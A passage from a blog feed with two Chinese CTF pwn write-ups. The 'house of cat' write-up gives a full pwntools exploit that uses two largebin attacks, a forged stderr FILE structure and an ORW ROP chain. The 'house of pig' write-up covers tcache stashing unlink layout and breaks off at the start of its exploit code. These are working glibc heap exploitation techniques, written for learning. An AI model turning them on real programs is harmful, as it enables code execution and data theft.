      <link href="/2023/07/27/house-of-cat/"/>
      <url>/2023/07/27/house-of-cat/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最后一天的题，水水</p></blockquote><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="格式检查"><a href="#格式检查" class="headerlink" title="格式检查"></a>格式检查</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOGIN | r00t QWBQWXFadmin</span><br><span class="line">CAT | r00t QWBQWXF$\xff</span><br></pre></td></tr></table></figure><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>index在0到15间</p><p>0x418&lt;&#x3D; size &lt;&#x3D;0x46f</p><p>使用calloc</p><h4 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h4><p>UAF</p><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>write 0x30</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>限制2次</p><p>每次只能修改<strong>0x30</strong></p><h2 id="攻击流程分析"><a href="#攻击流程分析" class="headerlink" title="攻击流程分析"></a>攻击流程分析</h2><p>由于不存在对exit的调用，且在main函数中无限循环，故无法进行FSOP</p><p>可以采用house of kiwi的触发IO思路，利用<code>__malloc_assert</code>调用<code>fflush(stderr)</code>或者<code>__fxprintf</code></p><p>所以需要攻击位于stderr上的指针，恰好本题该地址可写，这里使用一次largebin attack</p><p>另外，要触发<code>__malloc_assert</code>，需要修改topchunk的size</p><p>本题由于edit有长度限制，不方便使用之前构造堆重叠的方式，所以这里可以用第二次largebin attack攻击size</p><p>恰好共有两次edit机会，刚好用完e</p><p>另外，攻击top size时要注意，在将第二个chunk加入largebin时，不能改变top chunk的位置。也就是说，不能通过分配一个更大chunk的方式来得到第二个largechunk</p><p>这是因为对largebin进行unlink的操作在从topchunk分配chunk之前，此时修改过的size会被新的size覆盖掉。</p><p>所以这一步入largebin的操作，可以通过分配更小的chunk获得</p><p><img src="/../img/house-of-cat.assets/image-20230726120735530.png" alt="image-20230726120735530"></p><p>开了沙箱，禁用了execve，并检查read的fd是否为0</p><p>故只能打orw, 并且在open前需要先close(0)</p><h2 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h2><p>需要达到的效果是：两次largebin attack，分别使stderr指向可控内容的堆块、修改topchunk</p><p>看似比较简单，但需注意edit只能修改0x30，且只有两次机会</p><p>所以对伪造结构体内容的写入需要在add操作进行，入largebin之后对前6个地址会有覆盖，实测下来对IO利用没有影响</p><h2 id="IO利用流程分析"><a href="#IO利用流程分析" class="headerlink" title="IO利用流程分析"></a>IO利用流程分析</h2><p>_wide_data&#x3D;fake_io_addr+0x30</p><p>1.将[rdi+0xa0]<code>_wide_data</code>处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。<br>2.将新赋值的[rax1+0x20]<code>_IO_backup_base</code>处的内容赋值给rdx。<br>3.将[rax1+0xe0]</p><p>处的内容赋值给rax，称之为<strong>rax2</strong>。<br>4.call调用[rax2+0x18]处的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr ！=_wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">login = <span class="string">&quot;LOGIN | r00t QWB QWXFadmin&quot;</span></span><br><span class="line">cat = <span class="string">&quot;CAT | r00t QWB QWXF$\xff&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">p.send(login)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x420</span>, cyclic(<span class="number">0x420</span>))<span class="comment">#largechunk 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x440</span>, cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x450</span>, cyclic(<span class="number">0x450</span>))</span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#leak largechunk</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x21a0d0</span></span><br><span class="line">stderr_addr = libc_base + <span class="number">0x21a860</span></span><br><span class="line">setcontext61 = libc_base + <span class="number">0x53a6d</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;\x7f\x00\x00&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr_addr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000029cd6</span>+libc_base</span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line">syscall = <span class="number">0x0000000000091396</span> + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#fake stderr----------------------------------------</span></span><br><span class="line">fake_stderr = heap_base + <span class="number">0xf70</span></span><br><span class="line">fake_rdx = fake_stderr + <span class="number">0x10</span> + <span class="number">0x200</span></span><br><span class="line">fake_stack = fake_stderr + <span class="number">0x10</span> + <span class="number">0x320</span></span><br><span class="line">io = p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(<span class="number">1</span>) + p64(<span class="number">2</span>)<span class="comment">#rcx!=0</span></span><br><span class="line">io += p64(fake_rdx)<span class="comment">#backup_base rdx</span></span><br><span class="line">io += p64(setcontext61)</span><br><span class="line">io = io.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+<span class="number">0x21ba60</span>)<span class="comment">#lock</span></span><br><span class="line">io = io.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(fake_stderr+<span class="number">0x30</span>)<span class="comment">#wide_data rax1</span></span><br><span class="line">io = io.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(<span class="number">1</span>)<span class="comment">#mode</span></span><br><span class="line">io = io.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(fake_stderr+<span class="number">0x40</span>)</span><br><span class="line">io = io.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#fake rdx:</span></span><br><span class="line">payload = <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdi-&gt;0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(fake_stack)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">io += payload</span><br><span class="line">io = io.ljust(<span class="number">0x320</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="comment">#fake_stack:</span></span><br><span class="line">payload = p64(libc_base+libc.sym[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(fake_rdx)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">io+=payload</span><br><span class="line"></span><br><span class="line">io = io.ljust(<span class="number">0x430</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x440</span>,io)<span class="comment"># largebin 0 </span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x440</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x430</span>,cyclic(<span class="number">0x430</span>))<span class="comment">#largebin 1</span></span><br><span class="line"><span class="comment"># add(7,0x440,cyclic(0x440))</span></span><br><span class="line"><span class="comment"># add(8,0x420,cyclic(0x420))</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(stderr_addr-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x430</span>, cyclic(<span class="number">0x430</span>))<span class="comment">#calloc chunk6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack 2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)<span class="comment">#largebin 1 0x430</span></span><br><span class="line"><span class="comment">#delete(8)</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(heap_base+<span class="number">0x2538</span>-<span class="number">5</span>-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x41f</span>,cyclic(<span class="number">0x41f</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))<span class="comment">#trigger malloc assert</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of pig xctf2021final复现</title>
      <link href="/2023/07/27/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/07/27/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>阴间堆风水</p></blockquote><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="修复switch"><a href="#修复switch" class="headerlink" title="修复switch"></a>修复switch</h3><p>0: 0x3985 invalid</p><p>1: 0x3797 add</p><p>2: 0x37B3 show</p><p>3: 0x37cf edit</p><p>4: 0x37eb delet</p><p>5: 0x3807 change role</p><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>通过add函数，猜测出heap_list，heap_size的作用，结合free、edit函数找到两个标志位</p><p>结合每个的大小与偏移，推测出数组的数量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *<span class="built_in">list</span>[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">int</span> size[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag1[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag2[<span class="number">0x18</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tmp_house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">peppa_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_peppasize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">mummy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_mummysize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">daddy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_daddysize;</span><br><span class="line">  <span class="type">int</span> show_time;</span><br><span class="line">  <span class="type">int</span> edit_time;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><ol><li>填充1个1和n个0,使信息长度为N*512+448(bit)</li><li>用64bit存储填充前信息长度，加在后面，长度变为(N+1)*512</li><li>装入标准的幻数: A&#x3D;0x67452301, B&#x3D;0xefcdab89, C&#x3D;0x98badcfe, D&#x3D;0x10325476</li><li>四轮循环运算，循环次数为分组个数(N+1)</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    start = <span class="string">&quot;3c4400&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">            s=<span class="string">&#x27;A&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">            <span class="comment">#s=&#x27;B&#x27;+str(i)</span></span><br><span class="line">            <span class="comment">#s=&#x27;C&#x27;+str(i)</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Test %s &quot;</span> % s</span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(s).hexdigest().startswith(start):</span><br><span class="line">                <span class="built_in">print</span>(s)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A39275120</span></span><br><span class="line"><span class="string">B3332073</span></span><br><span class="line"><span class="string">C75929410</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul><li>add大小0x90~0x430，同一角色size只能增加</li><li>peppa 20次，mummy 10次，daddy 5次</li><li>peppa 0x30i, mummy 0x30i + 0x10, daddy 0x31i + 0x20</li><li>view 2次，edit 8次</li><li>delet后无法delet，切换角色可edit、view</li><li>daddy的add不用一直增加！</li><li>daddy add最后一次时会多calloc0xe8</li></ul><h2 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h2><h3 id="role的选择"><a href="#role的选择" class="headerlink" title="role的选择"></a>role的选择</h3><p>注意不同role的堆列表是独立的，同时不同role能修改的位置也不同</p><p>peppa可以修改fd,bk</p><p>mummy可以修改fd_nextsize,bk_nextsize</p><p>因而最好peppa打tcache stashing unlink, mummy打largebin attack</p><p>当然这不是绝对的，我们可以通过UAF达到对同一个堆块的混淆</p><h3 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache stashing unlink"></a>tcache stashing unlink</h3><p>1.<code>tcache</code>中放<code>5</code>个，<code>smallbin</code>中放两个</p><p>2.将<strong>后进</strong><code>smallbin</code>的<code>chunk</code>的<code>bk</code>(不破坏<code>fd</code>指针的情况下)修改为<code>[target-0x10]</code>(即target为将要加入tchache的chunk的user pointer处），同时将目标地址<code>+0x08</code>处（即target-&gt;bk)的值设置为一个指向可写内存的指针。</p><p> 3.从smallbin中取一个chunk，走完stash流程，目标地址就会被链入tcache中。</p><h3 id="布局的问题"><a href="#布局的问题" class="headerlink" title="布局的问题"></a>布局的问题</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><blockquote><p> 在tcache中放了5个的情况下，如何使两个chunk进入<strong>相同大小</strong>的smallbin？</p></blockquote><p>问题转化为：如何使两个chunk进入相同大小的unsortedbin，而不进入tcache</p><p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230723173130250.png" alt="image-20230723173130250"></p><p>考虑当unsortedbin中只有一个chunk时，分配较小的chunk时会从其中切一块使用，另一块放入lastrmainder（同样是unsortedbin）</p><p>所以我们先获取一个较大的unsortedbin，（这一步通过填满tcache获得），随后malloc一块较小的chunk,就可以获得目标大小的unsortedbin</p><p>注意这里最后需要获得两块unsortedbin,注意避免在分配第二块时把第一块拿掉。我一开始分配的大小为0x150,刚好可以拿掉一个0xa0剩下一个0xa0,但是在分配第二快时就会出现问题</p><p>我的解决方案是，切割0x160的块，从中取出0xb0，刚好剩下0xa0,同时第二次取0xb0时不会出现把获得的unsortedbin取走的情况</p><p>网上的解决方案是：再填另一个tcache，两次用不同的unsortedbin切割，但是这种方法比较浪费次数</p><p>同时，经过计算、微调，我这里切下来的smallbin的fd和bk刚好位于chunk1-&gt;7,1-&gt;8的可写区域</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><blockquote><p>改到_IO_list_all的指针后，如何修改内容？</p></blockquote><p>本题比较阴间的地方是，不能完整地修改一个堆块</p><p>好在出题人给add3加了一个gift,可以申请一个0xe8的完整可写的堆块</p><p>所以最后可以把largebin attack指向的largebin留着，完成add3的最后一步，使得daddy从这个largechunk中切一块，从而直接获得完整的修改权限</p><p>下策是修改large chunk的chain指针，使其指向可写堆块</p><h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 